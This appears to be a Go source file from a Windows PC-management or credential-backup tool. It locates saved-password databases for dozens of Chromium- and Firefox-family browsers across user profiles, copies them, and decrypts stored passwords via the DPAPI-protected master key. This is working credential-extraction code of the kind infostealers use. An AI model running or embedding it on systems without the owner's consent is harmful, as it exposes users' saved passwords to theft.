//go:build windows

package credwin

import (
	"io"
	"os"
	"path/filepath"
	"strings"
)

func browserCredentials(reveal bool) []Credential {
	var out []Credential
	for _, root := range userProfileRootsForBrowser(reveal) {
		local := filepath.Join(root, "AppData", "Local")
		roaming := filepath.Join(root, "AppData", "Roaming")
		for _, spec := range chromiumSpecs(local, roaming) {
			out = append(out, chromiumCredentials(spec, reveal)...)
			if len(out) >= maxCreds {
				return dedupeBrowserCreds(out[:maxCreds])
			}
		}
		for _, spec := range firefoxSpecs(roaming) {
			out = append(out, firefoxCredentials(spec, reveal)...)
			if len(out) >= maxCreds {
				return dedupeBrowserCreds(out[:maxCreds])
			}
		}
	}
	return dedupeBrowserCreds(out)
}

func chromiumSpecs(local, roaming string) []chromiumSpec {
	seen := map[string]bool{}
	var specs []chromiumSpec
	add := func(name, dir string) {
		dir = strings.TrimSpace(dir)
		if dir == "" {
			return
		}
		key := strings.ToLower(filepath.Clean(dir))
		if seen[key] {
			return
		}
		if st, err := os.Stat(dir); err != nil || !st.IsDir() {
			return
		}
		if _, err := os.Stat(filepath.Join(dir, "Local State")); err != nil {
			// Opera classic keeps Login Data beside Local State in the install dir.
			if _, err2 := os.Stat(filepath.Join(dir, "Login Data")); err2 != nil {
				return
			}
		}
		seen[key] = true
		specs = append(specs, chromiumSpec{Name: name, Dir: dir})
	}

	static := []struct {
		name string
		dir  string
	}{
		{"chrome", filepath.Join(local, "Google", "Chrome", "User Data")},
		{"chrome-canary", filepath.Join(local, "Google", "Chrome SxS", "User Data")},
		{"chrome-beta", filepath.Join(local, "Google", "Chrome Beta", "User Data")},
		{"chrome-dev", filepath.Join(local, "Google", "Chrome Dev", "User Data")},
		{"edge", filepath.Join(local, "Microsoft", "Edge", "User Data")},
		{"edge-beta", filepath.Join(local, "Microsoft", "Edge Beta", "User Data")},
		{"edge-dev", filepath.Join(local, "Microsoft", "Edge Dev", "User Data")},
		{"edge-canary", filepath.Join(local, "Microsoft", "Edge SxS", "User Data")},
		{"edge-webview", filepath.Join(local, "Microsoft", "EdgeWebView", "User Data")},
		{"brave", filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data")},
		{"brave-beta", filepath.Join(local, "BraveSoftware", "Brave-Browser-Beta", "User Data")},
		{"brave-nightly", filepath.Join(local, "BraveSoftware", "Brave-Browser-Nightly", "User Data")},
		{"vivaldi", filepath.Join(local, "Vivaldi", "User Data")},
		{"chromium", filepath.Join(local, "Chromium", "User Data")},
		{"opera", filepath.Join(local, "Opera Software", "Opera Stable")},
		{"opera-gx", filepath.Join(local, "Opera Software", "Opera GX Stable")},
		{"opera-neon", filepath.Join(local, "Opera Software", "Opera Neon", "User Data")},
		{"opera-beta", filepath.Join(local, "Opera Software", "Opera Beta")},
		{"opera-developer", filepath.Join(local, "Opera Software", "Opera Developer")},
		{"yandex", filepath.Join(local, "Yandex", "YandexBrowser", "User Data")},
		{"coccoc", filepath.Join(local, "CocCoc", "Browser", "User Data")},
		{"epic", filepath.Join(local, "Epic Privacy Browser", "User Data")},
		{"360", filepath.Join(local, "360Chrome", "Chrome", "User Data")},
		{"tor", filepath.Join(local, "Tor Browser", "Browser", "TorBrowser", "Data", "Browser")},
		{"iridium", filepath.Join(local, "Iridium", "User Data")},
		{"cent", filepath.Join(local, "CentBrowser", "User Data")},
		{"ucbrowser", filepath.Join(local, "UCBrowser", "User Data_i18n")},
		{"sleipnir", filepath.Join(local, "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer")},
		{"whale", filepath.Join(local, "Naver", "Naver Whale", "User Data")},
		{"arc", filepath.Join(local, "Arc", "User Data")},
		{"sidekick", filepath.Join(local, "Sidekick", "User Data")},
		{"opera-roaming", filepath.Join(roaming, "Opera Software", "Opera Stable")},
	}
	for _, item := range static {
		add(item.name, item.dir)
	}

	scanUserDataRoots := func(base, prefix string) {
		entries, err := os.ReadDir(base)
		if err != nil {
			return
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			name := strings.ToLower(e.Name())
			if strings.Contains(name, "update") || strings.Contains(name, "crash") {
				continue
			}
			candidate := filepath.Join(base, e.Name(), "User Data")
			if prefix != "" {
				add(prefix+"-"+slugBrowserName(e.Name()), candidate)
			} else {
				add(slugBrowserName(e.Name()), candidate)
			}
		}
	}
	scanUserDataRoots(local, "")
	scanUserDataRoots(roaming, "roaming")
	return specs
}

func slugBrowserName(name string) string {
	s := strings.ToLower(strings.TrimSpace(name))
	s = strings.ReplaceAll(s, " ", "-")
	s = strings.ReplaceAll(s, "_", "-")
	if s == "" {
		return "chromium"
	}
	return s
}

type firefoxSpec struct {
	Name string
	Dir  string
}

func firefoxSpecs(roaming string) []firefoxSpec {
	seen := map[string]bool{}
	var specs []firefoxSpec
	add := func(name, dir string) {
		dir = strings.TrimSpace(dir)
		if dir == "" {
			return
		}
		key := strings.ToLower(filepath.Clean(dir))
		if seen[key] {
			return
		}
		if st, err := os.Stat(dir); err != nil || !st.IsDir() {
			return
		}
		seen[key] = true
		specs = append(specs, firefoxSpec{Name: name, Dir: dir})
	}
	static := []struct {
		name string
		dir  string
	}{
		{"firefox", filepath.Join(roaming, "Mozilla", "Firefox", "Profiles")},
		{"firefox-dev", filepath.Join(roaming, "Mozilla", "Firefox Developer Edition", "Profiles")},
		{"waterfox", filepath.Join(roaming, "Waterfox", "Profiles")},
		{"librewolf", filepath.Join(roaming, "librewolf", "Profiles")},
		{"floorp", filepath.Join(roaming, "Floorp", "Profiles")},
		{"pale-moon", filepath.Join(roaming, "Moonchild Productions", "Pale Moon", "Profiles")},
	}
	for _, item := range static {
		add(item.name, item.dir)
	}
	entries, err := os.ReadDir(roaming)
	if err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			profiles := filepath.Join(roaming, e.Name(), "Profiles")
			if _, err := os.Stat(profiles); err == nil {
				add(slugBrowserName(e.Name()), profiles)
			}
		}
	}
	return specs
}

func chromiumCredentials(spec chromiumSpec, reveal bool) []Credential {
	localState := filepath.Join(spec.Dir, "Local State")
	key := chromiumMasterKey(localState)
	var out []Credential
	for _, profileDir := range chromiumProfileDirs(spec) {
		login := filepath.Join(profileDir, "Login Data")
		if _, err := os.Stat(login); err != nil {
			continue
		}
		profileName := profileDisplayName(spec.Dir, profileDir)
		rows := readChromiumLogins(login, key, reveal)
		if reveal && len(rows) == 0 {
			rows = readChromiumLoginsFallback(login, key, reveal)
		} else if reveal && countLockedPasswords(rows) == len(rows) && len(rows) > 0 {
			if fb := readChromiumLoginsFallback(login, key, reveal); len(fb) > 0 {
				rows = mergeChromiumLoginRows(rows, fb)
			}
		}
		for i := range rows {
			rows[i].Browser = spec.Name
			rows[i].Profile = profileName
			rows[i].Source = "browser"
			rows[i].Kind = "password"
			rows[i].Key = browserCredKey(spec.Name, profileName, rows[i].Target, rows[i].Username)
			if reveal && rows[i].Secret == "" {
				rows[i].Locked = true
				if rows[i].Comment == "" {
					if key == nil {
						rows[i].Comment = "DPAPI master key unavailable (needs interactive user session)"
					} else {
						rows[i].Comment = "password decrypt failed (close the browser and retry backup)"
					}
				}
			}
		}
		out = append(out, rows...)
	}
	return out
}

func chromiumProfileDirs(spec chromiumSpec) []string {
	var dirs []string
	if _, err := os.Stat(filepath.Join(spec.Dir, "Login Data")); err == nil {
		return []string{spec.Dir}
	}
	entries, err := os.ReadDir(spec.Dir)
	if err != nil {
		return nil
	}
	for _, p := range entries {
		if !p.IsDir() {
			continue
		}
		name := p.Name()
		if IsChromiumLoginProfile(name) || isChromiumProfileDir(name) {
			login := filepath.Join(spec.Dir, name, "Login Data")
			if _, err := os.Stat(login); err == nil {
				dirs = append(dirs, filepath.Join(spec.Dir, name))
			}
		}
	}
	return dirs
}

func profileDisplayName(userDataRoot, profileDir string) string {
	if filepath.Clean(profileDir) == filepath.Clean(userDataRoot) {
		return "Default"
	}
	return filepath.Base(profileDir)
}

func countLockedPasswords(rows []Credential) int {
	n := 0
	for _, r := range rows {
		if r.Locked || r.Secret == "" {
			n++
		}
	}
	return n
}

func mergeChromiumLoginRows(primary, fallback []Credential) []Credential {
	if len(fallback) == 0 {
		return primary
	}
	byKey := map[string]int{}
	for i, r := range primary {
		byKey[r.Key] = i
	}
	out := append([]Credential(nil), primary...)
	for _, r := range fallback {
		key := r.Key
		if key == "" {
			key = browserCredKey("", "", r.Target, r.Username)
		}
		if idx, ok := byKey[key]; ok {
			if out[idx].Secret == "" && r.Secret != "" {
				out[idx].Secret = r.Secret
				out[idx].Locked = false
				out[idx].Comment = ""
			}
			continue
		}
		out = append(out, r)
	}
	return out
}

func chromiumMasterKey(localState string) []byte {
	raw, err := os.ReadFile(localState)
	if err != nil {
		return nil
	}
	plain, err := UnwrapChromiumMasterKey(raw, dpapiDecrypt)
	if err != nil {
		return nil
	}
	return plain
}

func readChromiumLogins(dbPath string, key []byte, reveal bool) []Credential {
	tmp, err := os.CreateTemp("", "pcmgr-logins-*.db")
	if err != nil {
		return nil
	}
	tmpPath := tmp.Name()
	defer os.Remove(tmpPath)
	if err := copyLoginDB(dbPath, tmpPath); err != nil {
		return nil
	}
	rows := scanSqliteTableWithBlobs(tmpPath, "logins",
		[]string{"origin_url", "action_url", "username_value", "password_value", "date_created", "date_last_used", "date_password_modified"},
		[]string{"password_value"},
	)
	out := make([]Credential, 0, len(rows))
	for _, row := range rows {
		origin := strings.TrimSpace(row["origin_url"])
		if origin == "" {
			origin = strings.TrimSpace(row["action_url"])
		}
		user := strings.TrimSpace(row["username_value"])
		if origin == "" && user == "" {
			continue
		}
		c := Credential{
			Key:      browserCredKey("", "", origin, user),
			Source:   "browser",
			Kind:     "password",
			Target:   origin,
			Username: user,
		}
		if ts := chromeTime(row["date_last_used"]); ts != "" {
			c.LastWritten = ts
		} else if ts := chromeTime(row["date_password_modified"]); ts != "" {
			c.LastWritten = ts
		} else if ts := chromeTime(row["date_created"]); ts != "" {
			c.LastWritten = ts
		}
		if reveal {
			blob := []byte(row["password_value"])
			if len(blob) == 0 {
				continue
			}
			secret, err := DecryptChromiumPassword(blob, key, dpapiDecrypt)
			if err != nil {
				c.Locked = true
				c.Comment = err.Error()
			} else {
				c.Secret = secret
				if c.Secret == "" {
					c.Locked = true
				}
			}
		}
		out = append(out, c)
	}
	return out
}

func copyLoginDB(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0o600)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

func decryptChromiumSecret(blob, key []byte) string {
	s, _ := DecryptChromiumPassword(blob, key, dpapiDecrypt)
	return s
}

// userProfileRoots is kept for tests that reference profile discovery helpers.
func userProfileRoots() []string {
	return userProfileRootsForBrowser(false)
}
